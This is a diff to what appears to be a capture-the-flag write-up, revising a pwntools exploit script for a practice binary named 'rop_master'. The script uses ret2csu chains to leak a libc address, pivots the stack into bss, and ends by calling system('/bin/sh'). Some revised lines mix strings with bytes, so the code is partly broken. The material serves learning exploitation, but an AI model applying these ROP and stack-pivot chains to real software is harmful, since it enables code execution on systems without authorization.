@@ -214,6 +214,8 @@ p.interactive()
 ```python
 from pwn import *
 
+#context.log_level = 'debug'
+
 p = process('./rop_master')
 e = ELF('./rop_master')
 libc = e.libc
@@ -224,13 +226,14 @@ read_plt = 0x400440
 read_got = 0x601020
 write_plt = 0x400430
 write_got =  0x601018
-main = 0x0000000000400537
+main = 0x400537
 name = 0x601060
 pop_rdi = 0x00400613
+pop_rsp_pop3_ret = 0x0040060d
 leave_ret = 0x004005a2
 bss = e.bss() + 0x400
 
-p.recvuntil(b"Your name : ")
+
 
 #1 write(1, write_got, 8) by rtc
 payload = b'A'*0x8
@@ -244,26 +247,37 @@ payload += p64(write_got) #r14->rsi
 payload += p64(8) #r15->rdx
 payload += p64(csu1)
 
-#2 read(0, bss, 0x200)
+#2 read(0, bss, 40) by rtc
 payload += b'C'*0x8
 payload += p64(0) #rbx
 payload += p64(1) #rbp
 payload += p64(read_got) #r12
 payload += p64(0) #r13->edi
-payload += p64(bss) #r14->rsi
-payload += p64(len(0x200)) #r15->rdx
-payload += p64(main+92)
+payload += p64(bss+32) #r14->rsi
+payload += p64(40) #r15->rdx
+payload += p64(csu1)
 
+#3 stack pivoting by rtc
+payload += "D"*16
+payload += p64(bss)
+payload += "E"*32           
+payload += p64(pop_rsp_pop3_ret)
+payload += p64(bss)
+
+
+p.recvuntil(b"Your name : ")
+#pause()
 p.send(payload)
 
 
-p.recvuntil(b"Can you rop it?\n")
-
-#2 name stack pivot 
+#4 name stack pivoting
 payload = b'A'*0x100
 payload += p64(name)
 payload += p64(leave_ret)
 
+
+p.recvuntil(b"Can you rop it?\n")
+#pause()
 p.send(payload)
 
 
@@ -275,24 +289,14 @@ system_addr = libc_base + system_offset
 binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
 
 
-#3 system('/bin/sh')
+#6 system('/bin/sh')
 payload = b'A'*0x8
 payload += p64(pop_rdi)
 payload += p64(binsh)
 payload += p64(0x00400416) #ret
 payload += p64(system_addr)
 
-p.send(payload)
-
-
-p.recvuntil(b"Can you rop it?\n")
-
-#4 bss stack pivot
-payload = b'A'*0x100
-payload += p64(bss)
-payload += p64(leave_ret)
-
-
+#pause()
 p.send(payload)
 
 
